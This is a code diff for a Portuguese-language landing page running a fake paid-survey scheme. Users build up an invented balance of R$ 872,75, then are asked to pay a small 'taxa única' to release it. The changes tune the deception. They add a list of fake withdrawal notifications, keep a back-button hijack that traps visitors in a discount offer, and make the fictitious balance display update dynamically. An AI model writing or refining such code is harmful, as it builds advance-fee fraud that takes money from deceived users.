@@ -32,7 +32,7 @@
     </div>
   </header>
 
-  <!-- NOTIFICAÇÕES (POSICIONADAS ABAIXO DO HEADER E ALINHADAS À DIREITA) -->
+  <!-- NOTIFICAÇÕES -->
   <div class="w-full max-w-md mx-auto px-4 pt-2 -mb-2 relative z-30 flex justify-end">
     <div id="toast-container" class="transition-all duration-300 opacity-0 pointer-events-none w-auto max-w-[280px]">
       <div class="bg-white text-slate-800 p-2.5 px-3 rounded-2xl shadow-lg border border-slate-100 flex items-center space-x-2.5">
@@ -52,7 +52,6 @@
 
     <!-- ETAPA 1: Verificação de Idade & Banner de Geolocalização -->
     <div id="step-1" class="step-view bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 text-center space-y-5">
-      <!-- Tag de Ao Vivo & Estado -->
       <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
         <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
           <span class="w-2 h-2 rounded-full bg-pink-500 animate-ping"></span>
@@ -117,7 +116,7 @@
           <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
-      <button onclick="nextStep(3)" id="btn-q1" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+      <button onclick="nextStep(3, 180.00)" id="btn-q1" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
         Continuar ›
       </button>
     </div>
@@ -155,7 +154,7 @@
           <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
-      <button onclick="nextStep(4)" id="btn-q2" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+      <button onclick="nextStep(4, 195.50)" id="btn-q2" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
         Continuar ›
       </button>
     </div>
@@ -193,7 +192,7 @@
           <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
-      <button onclick="nextStep(5)" id="btn-q3" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+      <button onclick="nextStep(5, 165.25)" id="btn-q3" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
         Continuar ›
       </button>
     </div>
@@ -227,7 +226,7 @@
           <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
-      <button onclick="nextStep(6)" id="btn-q4" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+      <button onclick="nextStep(6, 172.00)" id="btn-q4" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
         Continuar ›
       </button>
     </div>
@@ -261,7 +260,7 @@
           <div class="w-5 h-5 rounded-full border-2 border-slate-300 group-hover:border-pink-500 flex items-center justify-center p-0.5"><div class="w-full h-full rounded-full bg-transparent"></div></div>
         </button>
       </div>
-      <button onclick="finishResearch()" id="btn-q5" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
+      <button onclick="finishResearch(160.00)" id="btn-q5" disabled class="w-full bg-slate-200 text-slate-400 font-semibold py-3.5 px-4 rounded-xl transition-all cursor-not-allowed">
         Processar Saldo Total
       </button>
     </div>
@@ -270,7 +269,7 @@
     <div id="step-7" class="step-view hidden bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-5">
       <div class="text-center space-y-1">
         <h2 class="text-xl font-bold text-slate-900">Confirmação de Visualização</h2>
-        <p class="text-xs text-slate-500">Assista ao vídeo abaixo por 40 segundos para liberar o saldo acumulado de R$ 872,75.</p>
+        <p class="text-xs text-slate-500">Assista ao vídeo abaixo por 40 segundos para liberar o saldo acumulado de <span class="total-balance-display">R$ 872,75</span>.</p>
       </div>
       
       <div id="video-container" class="w-full aspect-[9/16] max-h-[340px] bg-black rounded-2xl overflow-hidden relative shadow-inner">
@@ -306,11 +305,11 @@
       <div class="bg-pink-50/60 border border-pink-100 p-4 rounded-2xl flex items-center justify-between">
         <div>
           <span class="text-xs text-pink-600 font-semibold block uppercase">Total a Receber</span>
-          <span class="text-2xl font-black text-pink-700">R$ 872,75</span>
+          <span class="text-2xl font-black text-pink-700 total-balance-display">R$ 872,75</span>
         </div>
         <div class="text-right">
           <span class="text-xs text-slate-400 block">Taxa Única</span>
-          <span class="text-sm font-bold text-slate-700">R$ 6,90</span>
+          <span id="fee-display-amount" class="text-sm font-bold text-slate-700">R$ 6,90</span>
         </div>
       </div>
 
@@ -330,7 +329,7 @@
       </div>
 
       <button id="btn-pay-action" onclick="finishOrder(6.90)" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
-        PAGAR R$ 6,90 E RECEBER R$ 872,75
+        PAGAR R$ 6,90 E RECEBER <span class="total-balance-display">R$ 872,75</span>
       </button>
     </div>
 
@@ -353,7 +352,7 @@
       </div>
 
       <div class="text-xs text-slate-500 bg-amber-50 border border-amber-100 p-3 rounded-xl text-left leading-relaxed">
-        ⚠️ Assim que o pagamento for confirmado via SyncPay, o saldo de R$ 872,75 será enviado automaticamente para a sua conta.
+        ⚠️ Assim que o pagamento for confirmado via SyncPay, o saldo de <span class="total-balance-display">R$ 872,75</span> será enviado automaticamente para a sua conta.
       </div>
 
       <button onclick="switchStep(8)" class="w-full bg-slate-100 hover:bg-slate-200 text-slate-600 font-medium py-2.5 px-4 rounded-xl text-xs cursor-pointer transition-all">
@@ -361,7 +360,7 @@
       </button>
     </div>
 
-    <!-- ETAPA 10: TELA / MODAL DE DESCONTO (DISPARADA AO CLICAR NA SETA DE VOLTAR DO NAVEGADOR) -->
+    <!-- ETAPA 10: TELA / MODAL DE DESCONTO -->
     <div id="step-discount" class="step-view hidden bg-white rounded-3xl p-6 shadow-2xl border-2 border-emerald-400 space-y-5 text-center relative">
       <div class="bg-emerald-50 border border-emerald-200 p-3 rounded-2xl space-y-1">
         <div class="text-emerald-700 font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-1">
@@ -401,11 +400,13 @@
   <script>
     let currentStep = 1;
     let userBalance = 0;
+    let completedSteps = {}; // Guarda quais etapas já renderam valor para evitar duplicar saldo
     let videoTimer = null;
     let secondsWatched = 0;
     const totalRequired = 40;
     let discountCountdown = 299; // 5 minutos
     let discountInterval = null;
+    let hasDiscountBeenApplied = false;
 
     const fakeNotifications = [
       { name: "Ricardo Almeida de Castanhal", text: "sacou R$ 540,90" },
@@ -428,12 +429,21 @@
       }
     }
 
-    // --- 2. BACK REDIRECT / INTERCEPTAÇÃO DO BOTÃO VOLTAR ---
+    // --- 2. BACK REDIRECT SENSÍVEL AO CONTEXTO ---
     function setupBackRedirect() {
-      history.pushState(null, null, location.href);
-      window.onpopstate = function () {
-        history.pushState(null, null, location.href);
-        showDiscountScreen();
+      history.pushState({ step: currentStep }, null, location.href);
+      
+      window.onpopstate = function (e) {
+        // Se estiver nas telas finais (vídeo de validação, cadastro pix ou tela pix) dispara o modal de desconto
+        if (currentStep >= 7 || currentStep === 'discount') {
+          history.pushState(null, null, location.href);
+          showDiscountScreen();
+        } else if (currentStep > 1) {
+          // Durante o questionário, apenas volta normalmente uma etapa sem pular para a tela final de desconto
+          switchStep(currentStep - 1);
+        } else {
+          history.pushState(null, null, location.href);
+        }
       };
     }
 
@@ -461,9 +471,18 @@
     }
 
     function acceptDiscount() {
+      hasDiscountBeenApplied = true;
+      const totalAmount = userBalance + 150.00;
+      
+      // Atualiza textos na tela de cadastro de recebimento
+      document.getElementById('fee-display-amount').textContent = "R$ 4,90";
+      document.querySelectorAll('.total-balance-display').forEach(el => {
+        el.textContent = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      });
+
       switchStep(8);
       const btnPay = document.getElementById('btn-pay-action');
-      btnPay.textContent = "PAGAR R$ 4,90 (COM DESCONTO) E RECEBER R$ 1.022,75";
+      btnPay.innerHTML = `PAGAR R$ 4,90 (COM DESCONTO) E RECEBER <span class="total-balance-display">${totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span>`;
       btnPay.setAttribute('onclick', 'finishOrder(4.90)');
     }
 
@@ -494,8 +513,12 @@
 
     function switchStep(stepNumber) {
       document.querySelectorAll('.step-view').forEach(el => el.classList.add('hidden'));
-      document.getElementById('step-' + stepNumber).classList.remove('hidden');
+      const targetView = document.getElementById('step-' + stepNumber);
+      if (targetView) {
+        targetView.classList.remove('hidden');
+      }
       currentStep = stepNumber;
+      history.pushState({ step: currentStep }, null, location.href);
       window.scrollTo({ top: 0, behavior: 'smooth' });
 
       if (stepNumber === 7) {
@@ -547,23 +570,35 @@
       btnNext.classList.add('bg-pink-600', 'hover:bg-pink-700', 'text-white', 'cursor-pointer', 'shadow-md', 'shadow-pink-200');
     }
 
-    function nextStep(targetStep) {
-      if (targetStep === 3) userBalance += 180.00;
-      else if (targetStep === 4) userBalance += 195.50;
-      else if (targetStep === 5) userBalance += 165.25;
-      else if (targetStep === 6) userBalance += 172.00;
+    function nextStep(targetStep, amount) {
+      const currentQ = targetStep - 1;
+      // Garante que a recompensa dessa questão só seja somada uma vez
+      if (!completedSteps[currentQ]) {
+        userBalance += amount;
+        completedSteps[currentQ] = true;
+      }
       updateBalanceDisplay();
       switchStep(targetStep);
     }
 
-    function finishResearch() {
-      userBalance += 160.00; // Soma exata R$ 872,75
+    function finishResearch(amount) {
+      if (!completedSteps[5]) {
+        userBalance += amount; // Finaliza atingindo os R$ 872,75
+        completedSteps[5] = true;
+      }
       updateBalanceDisplay();
       switchStep(7);
     }
 
     function updateBalanceDisplay() {
-      document.getElementById('header-balance').textContent = userBalance.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      const formatted = userBalance.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      document.getElementById('header-balance').textContent = formatted;
+      
+      if (!hasDiscountBeenApplied) {
+        document.querySelectorAll('.total-balance-display').forEach(el => {
+          el.textContent = formatted;
+        });
+      }
     }
 
     function startVideoPlayer() {
@@ -660,7 +695,8 @@
         switchStep(8);
       } finally {
         btnPay.disabled = false;
-        btnPay.innerText = `PAGAR R$ ${customAmount.toFixed(2).replace('.', ',')} E RECEBER R$ 872,75`;
+        const totalDisp = hasDiscountBeenApplied ? (userBalance + 150) : userBalance;
+        btnPay.innerHTML = `PAGAR R$ ${customAmount.toFixed(2).replace('.', ',')} E RECEBER <span class="total-balance-display">R$ ${totalDisp.toFixed(2).replace('.', ',')}</span>`;
       }
     }
 
